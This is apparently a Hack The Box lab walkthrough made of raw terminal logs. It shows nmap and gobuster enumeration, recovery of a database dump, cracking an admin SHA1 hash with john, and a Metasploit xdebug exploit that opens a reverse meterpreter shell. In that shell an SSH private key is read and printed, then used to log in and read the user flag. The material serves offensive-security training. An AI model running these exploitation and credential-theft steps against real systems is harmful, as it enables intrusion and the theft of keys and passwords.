## Nmap scan
```bash
nmap -sC -sV -A -T4 10.129.186.91 -oN nmap.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 20:18 IST
Nmap scan report for 10.129.186.91
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/vpn/ /.ftp_uploads/
|_http-server-header: Apache/2.4.38 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.3 - 5.4 (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   199.14 ms 10.10.14.1
2   199.22 ms 10.129.186.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.75 seconds

```
```bash
gobuster dir -u http://10.129.186.91:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.186.91:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2021/12/06 20:29:46 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/robots.txt           (Status: 200) [Size: 55]
```
```bash
# git clone https://github.com/yonjar/fixgz.git
Cloning into 'fixgz'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (10/10), 9.19 KiB | 4.60 MiB/s, done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# cd fixgz 
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# ls -la               
total 44
drwxr-xr-x 3 root root  4096 Dec  6 20:34 .
drwxr-xr-x 3 root root  4096 Dec  6 20:34 ..
-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# g++ fixgz.cpp -o fixgz
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# ls -la
total 60
drwxr-xr-x 3 root root  4096 Dec  6 20:34 .
drwxr-xr-x 3 root root  4096 Dec  6 20:34 ..
-rwxr-xr-x 1 root root 16336 Dec  6 20:34 fixgz
-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# ./fixgz db.sql.gz db.gz                                                                                                  
fixgz: cannot open db.sql.gz
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# ./fixgz db.sql.gz db.gz                                                                                                                                                                                                            1 ⨯
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# ls -la
total 68
drwxr-xr-x 3 root root  4096 Dec  6 20:37 .
drwxr-xr-x 3 root root  4096 Dec  6 20:37 ..
-rw-r--r-- 1 root root   258 Dec  6 20:37 db.gz
-rw-r--r-- 1 root root   262 Dec  6 20:36 db.sql.gz
-rwxr-xr-x 1 root root 16336 Dec  6 20:34 fixgz
-rw-r--r-- 1 root root  1394 Dec  6 20:34 fixgz.cpp
-rw-r--r-- 1 root root 22763 Dec  6 20:34 fixgz.exe
drwxr-xr-x 8 root root  4096 Dec  6 20:34 .git
-rw-r--r-- 1 root root   135 Dec  6 20:34 README.md                                                                                                                                                                                                                                        
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# gunzip db.gz                                                                                                                                                                                                                       1 ⨯
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# cat db      
CREATE DATABASE static;
USE static;
CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); 
INSERT INTO users ( id, username, password, totp ) VALUES ( null, 'admin', 'd033e22ae348aeb5660fc2140aec35850c4da997', 'orxxi4c7orxwwzlo' );

                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# nvim hash
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# john hash
Created directory: /root/.john
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=16
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
admin            (?)     
1g 0:00:00:00 DONE 2/3 (2021-12-06 20:40) 100.0g/s 282400p/s 282400c/s 282400C/s Winnie..admin1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.
```



```bash
┌──(root💀sac)-[~/Downloads/hackthebox/www/fixgz]
└─# cd ..        
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# nvim web.ovpn 
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# nvim /etc/hosts           
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# ls -la               
total 24
drwxr-xr-x 3 root root 4096 Dec  6 20:45 .
drwxr-xr-x 4 root root 4096 Dec  6 20:45 ..
drwxr-xr-x 3 root root 4096 Dec  6 20:39 fixgz
-rw-r--r-- 1 root root 8303 Dec  6 20:44 web.ovpn
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# openvpn web.ovpn
2021-12-06 20:48:46 DEPRECATED OPTION: --cipher set to 'AES-256-CBC' but missing in --data-ciphers (AES-256-GCM:AES-128-GCM). Future OpenVPN version will ignore --cipher for cipher negotiations. Add 'AES-256-CBC' to --data-ciphers or change --cipher 'AES-256-CBC' to --data-ciphers-fallback 'AES-256-CBC' to silence this warning.
2021-12-06 20:48:46 OpenVPN 2.5.1 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on May 14 2021
-------------------------------snip-------------------------------------
```


```
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# ifconfig
eth0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 7c:10:c9:25:5a:d8  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 5496  bytes 274800 (268.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5496  bytes 274800 (268.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.48  netmask 255.255.254.0  destination 10.10.14.48
        inet6 fe80::40e8:cb81:40ef:7fe  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::102e  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 59291  bytes 27784621 (26.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 63088  bytes 9157432 (8.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun9: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 172.30.0.9  netmask 255.255.0.0  destination 172.30.0.9
        inet6 fe80::83e2:6aa0:82e7:882d  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
                                                                                                                                                                                                                                       
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# ip route add 172.20.0.0/24 dev tun9
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# msfconsole     
                                                  

  Metasploit Park, System Security Interface
  Version 4.0.5, Alpha E                                                                                                                                                                                                                   
  Ready...                                                                                                                                                                                                                                 
  > access security                                                                                                                                                                                                                        
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           
  YOU DIDN'T SAY THE MAGIC WORD!                                                                                                                                                                                                           


       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command

msf6 > use exploit/unix/http/xdebug_unauth_exec
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 exploit(unix/http/xdebug_unauth_exec) > set PATH /vpn/login.php
PATH => /vpn/login.php
msf6 exploit(unix/http/xdebug_unauth_exec) > set RHOSTS 172.20.0.10
RHOSTS => 172.20.0.10
msf6 exploit(unix/http/xdebug_unauth_exec) > set LHOST tun9
LHOST => tun9
msf6 exploit(unix/http/xdebug_unauth_exec) > set LPORT 9001
LPORT => 9001
msf6 exploit(unix/http/xdebug_unauth_exec) > options

Module options (exploit/unix/http/xdebug_unauth_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /vpn/login.php   yes       Path to target webapp
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.20.0.10      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       Callback host for accepting connections
   SRVPORT  9000             yes       Port to listen for the debugger
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun9             yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/http/xdebug_unauth_exec) > run

[*] Started reverse TCP handler on 172.30.0.9:9001 
[*] 172.20.0.10:80 - Waiting for client response.
[*] 172.20.0.10:80 - Receiving response
[*] 172.20.0.10:80 - Shell might take upto a minute to respond.Please be patient.
[*] 172.20.0.10:80 - Sending payload of size 2026 bytes
[*] Sending stage (39282 bytes) to 172.30.0.1
[*] Meterpreter session 1 opened (172.30.0.9:9001 -> 172.30.0.1:52934 ) at 2021-12-06 20:57:20 +0530
id

meterpreter > id
[-] Unknown command: id
meterpreter > shell
Process 67 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ls
actions.php
database.php
header.php
index.php
login.php
panel.php
src
pwd
/var/www/html/vpn
cd /home/www-data/.ssh
ls
authorized_keys
id_rsa
id_rsa.pub
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
-----END RSA PRIVATE KEY-----
```

```
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# nvim id_rsa_www-data  
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# chmod 600 id_rsa_www-data
                                                                                                                                                                                                                                           
┌──(root💀sac)-[~/Downloads/hackthebox/www]
└─# ssh -i id_rsa_www-data www-data@10.129.186.91 -p 2222
The authenticity of host '[10.129.186.91]:2222 ([10.129.186.91]:2222)' can't be established.
ED25519 key fingerprint is SHA256:hki6VXu+ef1RkYZkYFiyIaNgPd6e7boZm9pH7yJDQUI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.186.91]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$ ls -la
total 16
drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 .
drwxr-xr-x 3 root     root     4096 Jun 14 07:56 ..
lrwxrwxrwx 1 root     root        9 Jun 14 08:02 .bash_history -> /dev/null
drwx------ 2 www-data www-data 4096 Jun 14 08:00 .cache
drwx------ 2 www-data www-data 4096 Jun 14 07:54 .ssh
www-data@web:~$ cd /home
www-data@web:/home$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Jun 14 07:56 .
drwxr-xr-x 1 root     root     4096 Dec  6 14:46 ..
-rw-r--r-- 1 root     root       33 Apr  3  2020 user.txt
drwxr-x--- 4 www-data www-data 4096 Jun 14 08:02 www-data
www-data@web:/home$ cat user.txt
c3f343befcac5fa92fb5373456e94247
www-data@web:/home$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.10  netmask 255.255.255.0  broadcast 172.20.0.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 466  bytes 145895 (145.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 336  bytes 87689 (87.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.254.2  netmask 255.255.255.0  broadcast 192.168.254.255
        ether 02:42:c0:a8:fe:02  txqueuelen 0  (Ethernet)
        RX packets 27  bytes 10566 (10.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 9  bytes 627 (627.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1055 (1.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1055 (1.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
       
```

